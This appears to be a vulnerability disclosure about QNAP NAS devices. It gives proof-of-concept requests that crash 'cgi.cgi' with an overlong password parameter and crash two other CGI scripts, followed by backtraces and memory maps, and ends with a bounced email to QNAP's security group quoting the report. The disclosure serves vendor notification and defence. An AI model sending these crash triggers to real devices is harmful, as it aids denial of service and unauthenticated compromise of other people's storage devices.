@@ -1,0 +1,333 @@
+==================
+
+1) [Heap overflow]
+
+==================
+
+Path: /home/httpd/cgi-bin/cgi.cgi
+
+u = valid user [guest|admin]
+
+1.1)
+
+/* Remote */
+
+[Remote host]# echo -en "GET /cgi-bin/cgi.cgi?u=admin&p=`for((i=0;i<263;i++));do echo -en "A";done` HTTP/1.0\nHost: QNAP\n\n" | ncat --ssl 192.168.5.7 443
+
+HTTP/1.1 200 OK
+
+Date: Sat, 31 Dec 2016 00:01:11 GMT
+
+*** glibc detected *** cgi.cgi: free(): invalid next size (normal): 0x0806cec8 ***
+
+======= Backtrace: =========
+
+======= Memory map: ========
+
+08048000-08069000 r-xp 00000000 00: 0e 7559 /home/httpd/cgi-bin/authLogin.cgi
+
+08069000-0806b000 rw-p 00020000 00: 0e 7559 /home/httpd/cgi-bin/authLogin.cgi
+
+0806b000-0808c000 rw-p 00000000 00: 00 0 [heap]
+
+[====SNIP====]
+
+ffe53000-ffe54000 rw-p 00000000 00: 00 0
+
+Content-Length: 0
+
+Connection: close
+
+Content-Type: text/plain
+
+[Remote host]#
+
+=======
+
+1.2)
+
+/* Local test, to get more info from backtrace */
+
+# export QUERY_STRING="u=admin&p=`for((i=0;i<263;i++));do echo -en "A";done`"
+
+# ./cgi.cgi
+
+*** glibc detected *** ./cgi.cgi: free(): invalid next size (normal): 0x0806cec8 ***
+
+======= Backtrace: =========
+
+/lib/libc.so.6[0xf6c3da62]
+
+/lib/libc.so.6(cfree+0x89)[0xf6c3f729]
+
+/lib/libc.so.6(fclose+0x136)[0xf6c2e5c6]
+
+/lib/libnss_compat.so.2[0xf6b8ac25]
+
+/lib/libnss_compat.so.2(_nss_compat_getspnam_r+0xb2)[0xf6b8b282]
+
+/lib/libc.so.6(getspnam_r+0x77)[0xf6c9ef57]
+
+/lib/libc.so.6(getspnam+0x78)[0xf6c9e3f8]
+
+/usr/lib/libuLinux_NAS.so.0(Check_Local_User_Password+0x16c)[0xf7518972]
+
+/usr/lib/libuLinux_NAS.so.0(Check_System_User_Password+0x56)[0xf7518f66]
+
+/usr/lib/libuLinux_NAS.so.0(Check_NAS_Administrator_Password+0x24)[0xf75
+19098]
+
+./cgi.cgi[0x80502ed]
+
+./cgi.cgi[0x8051a7e]
+
+/lib/libc.so.6(__libc_start_main+0xe0)[0xf6bedf90]
+
+./cgi.cgi[0x804d151]
+
+======= Memory map: ========
+
+08048000-08069000 r-xp 00000000 00:0e 7559 /home/httpd/cgi-bin/authLogin.cgi
+
+08069000-0806b000 rw-p 00020000 00:0e 7559 /home/httpd/cgi-bin/authLogin.cgi
+
+0806b000-0808c000 rw-p 00000000 00:00 0 [heap]
+
+[====SNIP====]
+
+ffd9e000-ffdbe000 rwxp 00000000 00:00 0 [stack]
+
+ffdbe000-ffdbf000 rw-p 00000000 00:00 0
+
+Aborted
+
+#
+
+1.3)
+
+# export QUERY_STRING="u=admin&p=`for((i=0;i<5957;i++));do echo -en "A";done`"
+
+# ./cgi.cgi
+
+*** glibc detected *** : free(): invalid next size (normal): 0x0806e508 ***
+
+======= Backtrace: =========
+
+/lib/libc.so.6[0xf6c9da62]
+
+/lib/libc.so.6(cfree+0x89)[0xf6c9f729]
+
+/lib/libc.so.6(fclose+0x136)[0xf6c8e5c6]
+
+/lib/libnss_compat.so.2[0xf6beac25]
+
+/lib/libnss_compat.so.2(_nss_compat_getspnam_r+0xb2)[0xf6beb282]
+
+/lib/libc.so.6(getspnam_r+0x77)[0xf6cfef57]
+
+/lib/libc.so.6(getspnam+0x78)[0xf6cfe3f8]
+
+/usr/lib/libuLinux_NAS.so.0(Check_Local_User_Password+0x16c)[0xf7578972]
+
+/usr/lib/libuLinux_NAS.so.0(Check_System_User_Password+0x56)[0xf7578f66]
+
+/usr/lib/libuLinux_NAS.so.0(Check_NAS_Administrator_Password+0x24)[0xf75
+79098]
+
+[0x80502ed]
+
+[0x0]
+
+======= Memory map: ========
+
+08048000-08069000 r-xp 00000000 00:0e 6705 /home/httpd/cgi-bin/authLogin.cgi
+
+08069000-0806b000 rw-p 00020000 00:0e 6705 /home/httpd/cgi-bin/authLogin.cgi
+
+0806b000-0808c000 rw-p 00000000 00:00 0 [heap]
+
+[====SNIP====]
+
+# ./cgi.cgi
+
+Segmentation fault
+
+#
+
+# dmesg
+
+[====SNIP====]
+
+[ 2185.562493] cgi.cgi[17772]: segfault at ff9a4010 ip 00000000f6bd75c3 sp 00000000ff99f1bc error 4 in libc-2.6.1.so[f6b6b000+12d000]
+
+[====SNIP====]
+
+/* Local as shown below, but can of course be called from remote */
+
+==================
+
+2) [STACK junk]
+
+==================
+
+# export QUERY_STRING="bug"
+
+# ./jc.cgi
+
+Segmentation fault
+
+# dmesg
+
+[====SNIP====]
+
+[76277.192562] jc.cgi[18159]: segfault at 0 ip 00000000f6cbdffc sp 00000000ffeddbbc error 4 in libc-2.6.1.so[f6c52000+12d000]
+
+[====SNIP====]
+
+==================
+
+3) [STACK junk]
+
+==================
+
+/* Local as shown, but can be called from remote */
+
+# export QUERY_STRING="bug"
+
+# ./mediaGet.cgi
+
+Segmentation fault
+
+# dmesg
+
+[====SNIP====]
+
+[76802.837766] mediaGet.cgi[6589]: segfault at 0 ip 00000000f6bd8ffc sp 00000000ffc0498c error 4 in libc-2.6.1.so[f6b6d000+12d000]
+
+[====SNIP====]
+
+Have a nice day (and happy new year)
+
+/bashis
+
+========================
+
+Hello mcw (at) noemail (dot) eu [email concealed],
+
+We're writing to let you know that the group you tried to contact (security) may not exist, or you may not have permission to post messages to the group. A few more details on why you weren't able to post:
+
+* You might have spelled or formatted the group name incorrectly.
+
+* The owner of the group may have removed this group.
+
+* You may need to join the group before receiving permission to post.
+
+* This group may not be open to posting.
+
+If you have questions related to this or any other Google Group, visit the Help Center at https://support.google.com/a/qnap.com/bin/topic.py?topic=25838.
+
+Thanks,
+
+qnap.com admins
+
+----- Original message -----
+
+X-Received: by 10.99.242.5 with SMTP id v5mr94097752pgh.181.1483213806030;
+
+Sat, 31 Dec 2016 11:50:06 -0800 (PST)
+
+Return-Path: <mcw (at) noemail (dot) eu [email concealed]>
+
+Received: from qnappm.info (mail2.qnappm.info. [113.196.50.102])
+
+by mx.google.com with ESMTP id c74si60891262pfk.272.2016.12.31.11.50.05
+
+for <security (at) qnap (dot) com [email concealed]>;
+
+Sat, 31 Dec 2016 11:50:06 -0800 (PST)
+
+Received-SPF: fail (google.com: domain of mcw (at) noemail (dot) eu [email concealed] does not designate 113.196.50.102 as permitted sender) client-ip=113.196.50.102;
+
+Authentication-Results: mx.google.com;
+
+spf=fail (google.com: domain of mcw (at) noemail (dot) eu [email concealed] does not designate 113.196.50.102 as permitted sender) smtp.mailfrom=mcw (at) noemail (dot) eu [email concealed]
+
+X-AuthUser: qnap1688 (at) qnappm (dot) info [email concealed]
+
+Received: from aid.qnap.com ([113.196.50.99]:36962)
+
+by mail2.qnappm.info with [XMail 1.27 ESMTP Server]
+
+id <S7F885> for <security (at) qnap (dot) com [email concealed]> from <mcw (at) noemail (dot) eu [email concealed]>;
+
+Sun, 1 Jan 2017 04:13:48 +0800
+
+Date: Sun, 1 Jan 2017 03:50:06 +0800
+
+Return-Path: mcw (at) noemail (dot) eu [email concealed]
+
+To: security (at) qnap (dot) com [email concealed]
+
+From: bashis mcw <mcw (at) noemail (dot) eu [email concealed]>
+
+Subject: Reporting Security Issues - [Critical] QNAP NAS devices suffer of Heap Overflow!
+
+Message-ID: <5acc9d206d9601dc574a02b114c83e8a (at) aid.qnap (dot) com [email concealed]>
+
+X-Priority: 3
+
+X-Mailer: PHPMailer 5.1 (phpmailer.sourceforge.net)
+
+MIME-Version: 1.0
+
+Content-Type: multipart/alternative;
+
+boundary="b1_5acc9d206d9601dc574a02b114c83e8a"
+
+Category : Administration
+
+Subject : QNAP NAS devices suffer of Heap Overflow!
+
+Severity Level : Critical
+
+Description :
+
+Greetings gents,
+
+QNAP NAS devices suffer from a critical Heap Overflow in "cgi.cgi" and
+
+non critical stack crash in "jc.cgi and mediaGet.cgi".
+
+Successful exploitation of this heap overflow vulnerability can lead to
+
+unauthorised root (admin) privileges on QNAP devices with anonymous
+
+access. (no credential needed to exploit)
+
+Please note: 1st February 2017 i will release details of these bugs to
+
+Full Disclosure and Bugtraq e-mail lists.
+
+Please see below and attached.
+
+Have a nice day (and happy new year)
+
+/bashis
+
+==================
+
+1) [HEAP overflow]
+
+==================
+
+Path: /home/httpd/cgi-bin/cgi.cgi
+
+u = valid user [guest|admin]
+
+1.1)
+
+/* Remote */
+
+[Remote host]# echo -en "GET /cgi-bin/cgi.cgi?u=admin&p=`for((i=0;i
+
+Sign Time : 2017/01/01 03:50:06
